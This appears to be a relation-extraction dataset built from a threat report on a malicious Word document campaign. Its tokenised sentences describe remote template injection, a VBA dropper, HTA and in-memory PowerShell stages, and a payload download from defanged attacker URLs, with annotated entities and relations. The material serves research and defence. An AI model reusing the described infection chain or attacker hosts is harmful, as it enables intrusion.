"DOTM", "file", "is", "downloaded", "."], ["Stage", "2", ":", "VBA", "dropperThe", "downloaded", "DOTM", "executes", "the", "malicious", "Visual", "Basic", "for", "Applications", "(", "VBA", ")", "macro", "."], ["The", "VBA", "dropper", "code", "contains", "an", "encoded", "data", "blob", "which", "is", "decoded", "and", "written", "into", "an", "HTA", "file", ",", "``", "example.hta", ",", "''", "in", "the", "user", "profile", "local", "application", "temporary", "folder", "."], ["The", "decoded", "content", "written", "to", "an", "HTA", "file", "is", "the", "next", "VB", "script", ",", "which", "is", "executed", "using", "the", "ShellExecuted", "method", "."], ["An", "array", "of", "the", "encoded", "data", "will", "be", "decoded", "to", "a", "PowerShell", "script", ",", "which", "is", "generated", "in", "the", "victim", "'s", "system", "memory", "and", "executed", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [18, 18], "name": "document", "pos": [18, 19], "index": "0_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [71, 71], "name": "document", "pos": [8, 9], "index": "1_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [77, 77], "name": "https [ : // ] bitbucket.org/atlasover/atlassiancore/downloads/EmmaJardi.dotm", "pos": [14, 20], "index": "2_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [94, 94], "name": "victim", "pos": [2, 3], "index": "3_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [97, 97], "name": "document", "pos": [5, 6], "index": "4_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [101, 101], "name": "DOTM file", "pos": [9, 11], "index": "5_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [112, 112], "name": "DOTM", "pos": [6, 7], "index": "6_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [116, 116], "name": "Visual Basic for Applications", "pos": [10, 14], "index": "7_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [126, 126], "name": "VBA dropper", "pos": [1, 3], "index": "8_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [145, 145], "name": "example.hta", "pos": [20, 21], "index": "9_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [163, 163], "name": "HTA file", "pos": [6, 8], "index": "10_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [176, 176], "name": "ShellExecuted", "pos": [19, 20], "index": "11_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [184, 184], "name": "data", "pos": [5, 6], "index": "12_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [191, 191], "name": "script", "pos": [12, 13], "index": "13_0"}]], "labels": [{"r": "FR", "evidence": [3], "h": 3, "t": 4}, {"r": "EX", "evidence": [2, 3], "t": 1, "h": 4}, {"r": "ST", "evidence": [2, 3], "t": 2, "h": 4}, {"r": "RF", "evidence": [2, 3], "t": 2, "h": 4}, {"r": "WR", "evidence": [3], "h": 4, "t": 5}, {"r": "EX", "evidence": [3, 4], "t": 5, "h": 6}, {"r": "FR", "evidence": [4, 5], "h": 6, "t": 8}, {"r": "EX", "evidence": [4, 5], "t": 7, "h": 8}, {"r": "WR", "evidence": [5], "h": 8, "t": 9}, {"r": "WR", "evidence": [5, 6, 7], "h": 8, "t": 13}, {"r": "CO", "evidence": [5, 6], "h": 9, "t": 10}, {"r": "CO", "evidence": [5, 6, 7], "h": 9, "t": 12}, {"r": "EX", "evidence": [6], "t": 10, "h": 11}]}, {"title": "063-7", "sents": [["Talos", "discovered", "two", "different", "attack", "methodologies", "of", "this", "campaign", "with", "a", "few", "variations", "in", "the", "TTPs", "'", ",", "while", "the", "initial", "infection", "vector", ",", "use", "of", "remote", "template", "injection", "technique", "and", "the", "final", "payload", "remained", "the", "same", "."], ["Stage", "1", "maldoc", ":", "DOTM", "templateThe", "malicious", "Word", "document", "contains", "an", "embedded", "URL", ",", "https", "[", ":", "//", "]", "bitbucket.org/atlasover/atlassiancore/downloads/EmmaJardi.dotm", ",", "within", "its", "relationship", "component", "``", "word/_rels/settings.xml.rels", "''", "."], ["When", "a", "victim", "opens", "the", "document", ",", "the", "malicious", "DOTM", "file", "is", "downloaded", "."], ["Stage", "2", ":", "VBA", "dropperThe", "downloaded", "DOTM", "executes", "the", "malicious", "Visual", "Basic", "for", "Applications", "(", "VBA", ")", "macro", "."], ["The", "VBA", "dropper", "code", "contains", "an", "encoded", "data", "blob", "which", "is", "decoded", "and", "written", "into", "an", "HTA", "file", ",", "``", "example.hta", ",", "''", "in", "the", "user", "profile", "local", "application", "temporary", "folder", "."], ["The", "decoded", "content", "written", "to", "an", "HTA", "file", "is", "the", "next", "VB", "script", ",", "which", "is", "executed", "using", "the", "ShellExecuted", "method", "."], ["An", "array", "of", "the", "encoded", "data", "will", "be", "decoded", "to", "a", "PowerShell", "script", ",", "which", "is", "generated", "in", "the", "victim", "'s", "system", "memory", "and", "executed", "."], ["Stage", "4", "PowerShell", "scriptThe", "PowerShell", "dropper", "script", "executed", "in", "the", "victim", "'s", "system", "memory", "contains", "an", "AES-encrypted", "data", "blob", "as", "a", "base64-encoded", "string", "and", "another", "base64-encoded", "string", "of", "a", "decryption", "key", "."]], "vertexSet": [[{"type": "MF", "sent_id": 1, "global_pos": [46, 46], "name": "document", "pos": [8, 9], "index": "0_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [52, 52], "name": "https [ : // ] bitbucket.org/atlasover/atlassiancore/downloads/EmmaJardi.dotm", "pos": [14, 20], "index": "1_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [69, 69], "name": "victim", "pos": [2, 3], "index": "2_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [72, 72], "name": "document", "pos": [5, 6], "index": "3_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [76, 76], "name": "DOTM file", "pos": [9, 11], "index": "4_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [87, 87], "name": "DOTM", "pos": [6, 7], "index": "5_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [91, 91], "name": "Visual Basic for Applications", "pos": [10, 14], "index": "6_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [101, 101], "name": "VBA dropper", "pos": [1, 3], "index": "7_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [120, 120], "name": "example.hta", "pos": [20, 21], "index": "8_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [138, 138], "name": "HTA file", "pos": [6, 8], "index": "9_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [151, 151], "name": "ShellExecuted", "pos": [19, 20], "index": "10_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [159, 159], "name": "data", "pos": [5, 6], "index": "11_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [166, 166], "name": "script", "pos": [12, 13], "index": "12_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [186, 186], "name": "script", "pos": [6, 7], "index": "13_0"}]], "labels": [{"r": "FR", "evidence": [2], "h": 2, "t": 3}, {"r": "EX", "evidence": [1, 2], "t": 0, "h": 3}, {"r": "ST", "evidence": [1, 2], "t": 1, "h": 3}, {"r": "RF", "evidence": [1, 2], "t": 1, "h": 3}, {"r": "WR", "evidence": [2], "h": 3, "t": 4}, {"r": "EX", "evidence": [2, 3], "t": 4, "h": 5}, {"r": "FR", "evidence": [3, 4], "h": 5, "t": 7}, {"r": "EX", "evidence": [3, 4], "t": 6, "h": 7}, {"r": "WR", "evidence": [4], "h": 7, "t": 8}, {"r": "WR", "evidence": [4, 5, 6], "h": 7, "t": 12}, {"r": "FR", "evidence": [4, 5, 6, 7], "h": 7, "t": 13}, {"r": "CO", "evidence": [4, 5], "h": 8, "t": 9}, {"r": "CO", "evidence": [4, 5, 6], "h": 8, "t": 11}, {"r": "EX", "evidence": [5], "t": 9, "h": 10}, {"r": "EX", "evidence": [6, 7], "t": 12, "h": 13}]}, {"title": "063-8", "sents": [["Stage", "1", "maldoc", ":", "DOTM", "templateThe", "malicious", "Word", "document", "contains", "an", "embedded", "URL", ",", "https", "[", ":", "//", "]", "bitbucket.org/atlasover/atlassiancore/downloads/EmmaJardi.dotm", ",", "within", "its", "relationship", "component", "``", "word/_rels/settings.xml.rels", "''", "."], ["When", "a", "victim", "opens", "the", "document", ",", "the", "malicious", "DOTM", "file", "is", "downloaded", "."], ["Stage", "2", ":", "VBA", "dropperThe", "downloaded", "DOTM", "executes", "the", "malicious", "Visual", "Basic", "for", "Applications", "(", "VBA", ")", "macro", "."], ["The", "VBA", "dropper", "code", "contains", "an", "encoded", "data", "blob", "which", "is", "decoded", "and", "written", "into", "an", "HTA", "file", ",", "``", "example.hta", ",", "''", "in", "the", "user", "profile", "local", "application", "temporary", "folder", "."], ["The", "decoded", "content", "written", "to", "an", "HTA", "file", "is", "the", "next", "VB", "script", ",", "which", "is", "executed", "using", "the", "ShellExecuted", "method", "."], ["An", "array", "of", "the", "encoded", "data", "will", "be", "decoded", "to", "a", "PowerShell", "script", ",", "which", "is", "generated", "in", "the", "victim", "'s", "system", "memory", "and", "executed", "."], ["Stage", "4", "PowerShell", "scriptThe", "PowerShell", "dropper", "script", "executed", "in", "the", "victim", "'s", "system", "memory", "contains", "an", "AES-encrypted", "data", "blob", "as", "a", "base64-encoded", "string", "and", "another", "base64-encoded", "string", "of", "a", "decryption", "key", "."], ["The", "encoded", "strings", "are", "converted", "to", "generate", "the", "AES", "encrypted", "data", "block", "and", "the", "256-bit", "AES", "decryption", "key", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [8, 8], "name": "document", "pos": [8, 9], "index": "0_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [14, 14], "name": "https [ : // ] bitbucket.org/atlasover/atlassiancore/downloads/EmmaJardi.dotm", "pos": [14, 20], "index": "1_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [31, 31], "name": "victim", "pos": [2, 3], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [34, 34], "name": "document", "pos": [5, 6], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [38, 38], "name": "DOTM file", "pos": [9, 11], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [49, 49], "name": "DOTM", "pos": [6, 7], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [53, 53], "name": "Visual Basic for Applications", "pos": [10, 14], "index": "6_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [63, 63], "name": "VBA dropper", "pos": [1, 3], "index": "7_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [82, 82], "name": "example.hta", "pos": [20, 21], "index": "8_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [100, 100], "name": "HTA file", "pos": [6, 8], "index": "9_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [113, 113], "name": "ShellExecuted", "pos": [19, 20], "index": "10_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [121, 121], "name": "data", "pos": [5, 6], "index": "11_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [128, 128], "name": "script", "pos": [12, 13], "index": "12_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [148, 148], "name": "script", "pos": [6, 7], "index": "13_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [184, 184], "name": "data block", "pos": [10, 12], "index": "14_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [191, 191], "name": "key", "pos": [17, 18], "index": "15_0"}]], "labels": [{"r": "FR", "evidence": [1], "h": 2, "t": 3}, {"r": "EX", "evidence": [0, 1], "t": 0, "h": 3}, {"r": "ST", "evidence": [0, 1], "t": 1, "h": 3}, {"r": "RF", "evidence": [0, 1], "t": 1, "h": 3}, {"r": "WR", "evidence": [1], "h": 3, "t": 4}, {"r": "EX", "evidence": [1, 2], "t": 4, "h": 5}, {"r": "FR", "evidence": [2, 3], "h": 5, "t": 7}, {"r": "EX", "evidence": [2, 3], "t": 6, "h": 7}, {"r": "WR", "evidence": [3], "h": 7, "t": 8}, {"r": "WR", "evidence": [3, 4, 5], "h": 7, "t": 12}, {"r": "FR", "evidence": [3, 4, 5, 6], "h": 7, "t": 13}, {"r": "CO", "evidence": [3, 4], "h": 8, "t": 9}, {"r": "CO", "evidence": [3, 4, 5], "h": 8, "t": 11}, {"r": "EX", "evidence": [4], "t": 9, "h": 10}, {"r": "EX", "evidence": [5, 6], "t": 12, "h": 13}, {"r": "WR", "evidence": [6, 7], "h": 13, "t": 14}, {"r": "WR", "evidence": [6, 7], "h": 13, "t": 15}]}, {"title": "063-9", "sents": [["When", "a", "victim", "opens", "the", "document", ",", "the", "malicious", "DOTM", "file", "is", "downloaded", "."], ["Stage", "2", ":", "VBA", "dropperThe", "downloaded", "DOTM", "executes", "the", "malicious", "Visual", "Basic", "for", "Applications", "(", "VBA", ")", "macro", "."], ["The", "VBA", "dropper", "code", "contains", "an", "encoded", "data", "blob", "which", "is", "decoded", "and", "written", "into", "an", "HTA", "file", ",", "``", "example.hta", ",", "''", "in", "the", "user", "profile", "local", "application", "temporary", "folder", "."], ["The", "decoded", "content", "written", "to", "an", "HTA", "file", "is", "the", "next", "VB", "script", ",", "which", "is", "executed", "using", "the", "ShellExecuted", "method", "."], ["An", "array", "of", "the", "encoded", "data", "will", "be", "decoded", "to", "a", "PowerShell", "script", ",", "which", "is", "generated", "in", "the", "victim", "'s", "system", "memory", "and", "executed", "."], ["Stage", "4", "PowerShell", "scriptThe", "PowerShell", "dropper", "script", "executed", "in", "the", "victim", "'s", "system", "memory", "contains", "an", "AES-encrypted", "data", "blob", "as", "a", "base64-encoded", "string", "and", "another", "base64-encoded", "string", "of", "a", "decryption", "key", "."], ["The", "encoded", "strings", "are", "converted", "to", "generate", "the", "AES", "encrypted", "data", "block", "and", "the", "256-bit", "AES", "decryption", "key", "."], ["Using", "the", "decryption", "key", ",", "the", "encrypted", "data", "generates", "a", "PowerShell", "downloader", "script", ",", "which", "is", "executed", "using", "the", "PowerShell", "IEX", "function", "."]], "vertexSet": [[{"type": "TP", "sent_id": 0, "global_pos": [2, 2], "name": "victim", "pos": [2, 3], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [5, 5], "name": "document", "pos": [5, 6], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [9, 9], "name": "DOTM file", "pos": [9, 11], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [20, 20], "name": "DOTM", "pos": [6, 7], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [24, 24], "name": "Visual Basic for Applications", "pos": [10, 14], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [34, 34], "name": "VBA dropper", "pos": [1, 3], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [53, 53], "name": "example.hta", "pos": [20, 21], "index": "6_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [71, 71], "name": "HTA file", "pos": [6, 8], "index": "7_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [84, 84], "name": "ShellExecuted", "pos": [19, 20], "index": "8_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [92, 92], "name": "data", "pos": [5, 6], "index": "9_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [99, 99], "name": "script", "pos": [12, 13], "index": "10_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [119, 119], "name": "script", "pos": [6, 7], "index": "11_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [155, 155], "name": "data block", "pos": [10, 12], "index": "12_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [162, 162], "name": "key", "pos": [17, 18], "index": "13_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [176, 176], "name": "script", "pos": [12, 13], "index": "14_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [183, 183], "name": "PowerShell", "pos": [19, 20], "index": "15_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0], "h": 1, "t": 2}, {"r": "EX", "evidence": [0, 1], "t": 2, "h": 3}, {"r": "FR", "evidence": [1, 2], "h": 3, "t": 5}, {"r": "EX", "evidence": [1, 2], "t": 4, "h": 5}, {"r": "WR", "evidence": [2], "h": 5, "t": 6}, {"r": "WR", "evidence": [2, 3, 4], "h": 5, "t": 10}, {"r": "FR", "evidence": [2, 3, 4, 5], "h": 5, "t": 11}, {"r": "CO", "evidence": [2, 3], "h": 6, "t": 7}, {"r": "CO", "evidence": [2, 3, 4], "h": 6, "t": 9}, {"r": "EX", "evidence": [3], "t": 7, "h": 8}, {"r": "EX", "evidence": [4, 5], "t": 10, "h": 11}, {"r": "WR", "evidence": [5, 6], "h": 11, "t": 12}, {"r": "WR", "evidence": [5, 6], "h": 11, "t": 13}, {"r": "WR", "evidence": [5, 6, 7], "h": 11, "t": 14}]}, {"title": "063-10", "sents": [["Stage", "2", ":", "VBA", "dropperThe", "downloaded", "DOTM", "executes", "the", "malicious", "Visual", "Basic", "for", "Applications", "(", "VBA", ")", "macro", "."], ["The", "VBA", "dropper", "code", "contains", "an", "encoded", "data", "blob", "which", "is", "decoded", "and", "written", "into", "an", "HTA", "file", ",", "``", "example.hta", ",", "''", "in", "the", "user", "profile", "local", "application", "temporary", "folder", "."], ["The", "decoded", "content", "written", "to", "an", "HTA", "file", "is", "the", "next", "VB", "script", ",", "which", "is", "executed", "using", "the", "ShellExecuted", "method", "."], ["An", "array", "of", "the", "encoded", "data", "will", "be", "decoded", "to", "a", "PowerShell", "script", ",", "which", "is", "generated", "in", "the", "victim", "'s", "system", "memory", "and", "executed", "."], ["Stage", "4", "PowerShell", "scriptThe", "PowerShell", "dropper", "script", "executed", "in", "the", "victim", "'s", "system", "memory", "contains", "an", "AES-encrypted", "data", "blob", "as", "a", "base64-encoded", "string", "and", "another", "base64-encoded", "string", "of", "a", "decryption", "key", "."], ["The", "encoded", "strings", "are", "converted", "to", "generate", "the", "AES", "encrypted", "data", "block", "and", "the", "256-bit", "AES", "decryption", "key", "."], ["Using", "the", "decryption", "key", ",", "the", "encrypted", "data", "generates", "a", "PowerShell", "downloader", "script", ",", "which", "is", "executed", "using", "the", "PowerShell", "IEX", "function", "."], ["Stage", "5", "PowerShell", "downloaderThe", "PowerShell", "downloader", "script", "is", "obfuscated", "and", "contains", "encoded", "blocks", "that", "are", "decoded", "to", "generate", "the", "download", "URL", ",", "file", "execution", "path", "and", "file", "extensions", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [6, 6], "name": "DOTM", "pos": [6, 7], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [10, 10], "name": "Visual Basic for Applications", "pos": [10, 14], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [20, 20], "name": "VBA dropper", "pos": [1, 3], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [39, 39], "name": "example.hta", "pos": [20, 21], "index": "3_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [57, 57], "name": "HTA file", "pos": [6, 8], "index": "4_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [70, 70], "name": "ShellExecuted", "pos": [19, 20], "index": "5_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [78, 78], "name": "data", "pos": [5, 6], "index": "6_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [85, 85], "name": "script", "pos": [12, 13], "index": "7_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [105, 105], "name": "script", "pos": [6, 7], "index": "8_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [141, 141], "name": "data block", "pos": [10, 12], "index": "9_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [148, 148], "name": "key", "pos": [17, 18], "index": "10_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [162, 162], "name": "script", "pos": [12, 13], "index": "11_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [169, 169], "name": "PowerShell", "pos": [19, 20], "index": "12_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [179, 179], "name": "script", "pos": [6, 7], "index": "13_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [192, 192], "name": "download URL", "pos": [19, 21], "index": "14_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [195, 195], "name": "file execution path", "pos": [22, 25], "index": "15_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [199, 199], "name": "file extensions", "pos": [26, 28], "index": "16_0"}]], "labels": [{"r": "FR", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "EX", "evidence": [0, 1], "t": 1, "h": 2}, {"r": "WR", "evidence": [1], "h": 2, "t": 3}, {"r": "WR", "evidence": [1, 2, 3], "h": 2, "t": 7}, {"r": "FR", "evidence": [1, 2, 3, 4], "h": 2, "t": 8}, {"r": "CO", "evidence": [1, 2], "h": 3, "t": 4}, {"r": "CO", "evidence": [1, 2, 3], "h": 3, "t": 6}, {"r": "EX", "evidence": [2], "t": 4, "h": 5}, {"r": "EX", "evidence": [3, 4], "t": 7, "h": 8}, {"r": "WR", "evidence": [4, 5], "h": 8, "t": 9}, {"r": "WR", "evidence": [4, 5], "h": 8, "t": 10}, {"r": "WR", "evidence": [4, 5, 6], "h": 8, "t": 11}, {"r": "FR", "evidence": [6, 7], "h": 12, "t": 13}, {"r": "EX", "evidence": [6, 7], "t": 11, "h": 13}, {"r": "WR", "evidence": [7], "h": 13, "t": 14}, {"r": "WR", "evidence": [7], "h": 13, "t": 15}, {"r": "WR", "evidence": [7], "h": 13, "t": 16}]}, {"title": "063-11", "sents": [["The", "VBA", "dropper", "code", "contains", "an", "encoded", "data", "blob", "which", "is", "decoded", "and", "written", "into", "an", "HTA", "file", ",", "``", "example.hta", ",", "''", "in", "the", "user", "profile", "local", "application", "temporary", "folder", "."], ["The", "decoded", "content", "written", "to", "an", "HTA", "file", "is", "the", "next", "VB", "script", ",", "which", "is", "executed", "using", "the", "ShellExecuted", "method", "."], ["An", "array", "of", "the", "encoded", "data", "will", "be", "decoded", "to", "a", "PowerShell", "script", ",", "which", "is", "generated", "in", "the", "victim", "'s", "system", "memory", "and", "executed", "."], ["Stage", "4", "PowerShell", "scriptThe", "PowerShell", "dropper", "script", "executed", "in", "the", "victim", "'s", "system", "memory", "contains", "an", "AES-encrypted", "data", "blob", "as", "a", "base64-encoded", "string", "and", "another", "base64-encoded", "string", "of", "a", "decryption", "key", "."], ["The", "encoded", "strings", "are", "converted", "to", "generate", "the", "AES", "encrypted", "data", "block", "and", "the", "256-bit", "AES", "decryption", "key", "."], ["Using", "the", "decryption", "key", ",", "the", "encrypted", "data", "generates", "a", "PowerShell", "downloader", "script", ",", "which", "is", "executed", "using", "the", "PowerShell", "IEX", "function", "."], ["Stage", "5", "PowerShell", "downloaderThe", "PowerShell", "downloader", "script", "is", "obfuscated", "and", "contains", "encoded", "blocks", "that", "are", "decoded", "to", "generate", "the", "download", "URL", ",", "file", "execution", "path", "and", "file", "extensions", "."], ["The", "following", "actions", "are", "performed", "by", "the", "script", "upon", "its", "execution", "in", "victim", "'s", "system", "memory", ":", "The", "script", "downloads", "the", "payload", "from", "the", "actor", "controlled", "remote", "location", "through", "the", "URL", "``", "https", "[", ":", "//", "]", "bitbucket.org/atlasover/atlassiancore/downloads/newmodeler.dll", "''", "to", "the", "user", "profile", "local", "application", "temporary", "folder", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "VBA dropper", "pos": [1, 3], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [20, 20], "name": "example.hta", "pos": [20, 21], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [38, 38], "name": "HTA file", "pos": [6, 8], "index": "2_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [51, 51], "name": "ShellExecuted", "pos": [19, 20], "index": "3_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [59, 59], "name": "data", "pos": [5, 6], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [66, 66], "name": "script", "pos": [12, 13], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [86, 86], "name": "script", "pos": [6, 7], "index": "6_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [122, 122], "name": "data block", "pos": [10, 12], "index": "7_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [129, 129], "name": "key", "pos": [17, 18], "index": "8_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [143, 143], "name": "script", "pos": [12, 13], "index": "9_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [150, 150], "name": "PowerShell", "pos": [19, 20], "index": "10_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [160, 160], "name": "script", "pos": [6, 7], "index": "11_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [173, 173], "name": "download URL", "pos": [19, 21], "index": "12_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [176, 176], "name": "file execution path", "pos": [22, 25], "index": "13_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [180, 180], "name": "file extensions", "pos": [26, 28], "index": "14_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [201, 201], "name": "script", "pos": [18, 19], "index": "15_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [204, 204], "name": "payload", "pos": [21, 22], "index": "16_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [215, 215], "name": "https [ : // ] bitbucket.org/atlasover/atlassiancore/downloads/newmodeler.dll", "pos": [32, 38], "index": "17_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0, 1, 2], "h": 0, "t": 5}, {"r": "FR", "evidence": [0, 1, 2, 3], "h": 0, "t": 6}, {"r": "CO", "evidence": [0, 1], "h": 1, "t": 2}, {"r": "CO", "evidence": [0, 1, 2], "h": 1, "t": 4}, {"r": "EX", "evidence": [1], "t": 2, "h": 3}, {"r": "EX", "evidence": [2, 3], "t": 5, "h": 6}, {"r": "WR", "evidence": [3, 4], "h": 6, "t": 7}, {"r": "WR", "evidence": [3, 4], "h": 6, "t": 8}, {"r": "WR", "evidence": [3, 4, 5], "h": 6, "t": 9}, {"r": "FR", "evidence": [5, 6], "h": 10, "t": 11}, {"r": "EX", "evidence": [5, 6], "t": 9, "h": 11}, {"r": "WR", "evidence": [6], "h": 11, "t": 12}, {"r": "WR", "evidence": [6], "h": 11, "t": 13}, {"r": "WR", "evidence": [6], "h": 11, "t": 14}, {"r": "CO", "evidence": [6, 7], "h": 11, "t": 15}, {"r": "WR", "evidence": [7], "h": 15, "t": 16}, {"r": "ST", "evidence": [7], "h": 15, "t": 17}, {"r": "RF", "evidence": [7], "h": 15, "t": 17}]}, {"title": "063-12", "sents": [["The", "decoded", "content", "written", "to", "an", "HTA", "file", "is", "the", "next", "VB", "script", ",", "which", "is", "executed", "using", "the", "ShellExecuted", "method", "."], ["An", "array", "of", "the", "encoded", "data", "will", "be", "decoded", "to", "a", "PowerShell", "script", ",", "which", "is", "generated", "in", "the", "victim", "'s", "system", "memory", "and", "executed", "."], ["Stage", "4", "PowerShell", "scriptThe", "PowerShell", "dropper", "script", "executed", "in", "the", "victim", "'s", "system", "memory", "contains", "an", "AES-encrypted", "data", "blob", "as", "a", "base64-encoded", "string", "and", "another", "base64-encoded", "string", "of", "a", "decryption", "key", "."], ["The", "encoded", "strings", "are", "converted", "to", "generate", "the", "AES", "encrypted", "data", "block", "and", "the", "256-bit", "AES", "decryption", "key", "."], ["Using", "the", "decryption", "key", ",", "the", "encrypted", "data", "generates", "a", "PowerShell", "downloader", "script", ",", "which", "is", "executed", "using", "the", "PowerShell", "IEX", "function", "."], ["Stage", "5", "PowerShell", "downloaderThe", "PowerShell", "downloader", "script", "is", "obfuscated", "and", "contains", "encoded", "blocks", "that", "are", "decoded", "to", "generate", "the", "download", "URL", ",", "file", "execution", "path", "and", "file", "extensions", "."], ["The", "following", "actions", "are", "performed", "by", "the", "script", "upon", "its", "execution", "in", "victim", "'s", "system", "memory", ":", "The", "script", "downloads", "the", "payload", "from", "the", "actor", "controlled", "remote", "location", "through", "the", "URL", "``", "https", "[", ":", "//", "]", "bitbucket.org/atlasover/atlassiancore/downloads/newmodeler.dll", "''", "to", "the", "user", "profile", "local", "application", "temporary", "folder", "."], ["The", "script", "performs", "a", "check", "on", "the", "file", "extension", "of", "the", "downloaded", "payload", "file", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [6, 6], "name": "HTA file", "pos": [6, 8], "index": "0_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [19, 19], "name": "ShellExecuted", "pos": [19, 20], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [27, 27], "name": "data", "pos": [5, 6], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [34, 34], "name": "script", "pos": [12, 13], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [54, 54], "name": "script", "pos": [6, 7], "index": "4_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [90, 90], "name": "data block", "pos": [10, 12], "index": "5_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [97, 97], "name": "key", "pos": [17, 18], "index": "6_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [111, 111], "name": "script", "pos": [12, 13], "index": "7_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [118, 118], "name": "PowerShell", "pos": [19, 20], "index": "8_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [128, 128], "name": "script", "pos": [6, 7], "index": "9_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [141, 141], "name": "download URL", "pos": [19, 21], "index": "10_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [144, 144], "name": "file execution path", "pos": [22, 25], "index": "11_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [148, 148], "name": "file extensions", "pos": [26, 28], "index": "12_0"}], [{"type": "MP", 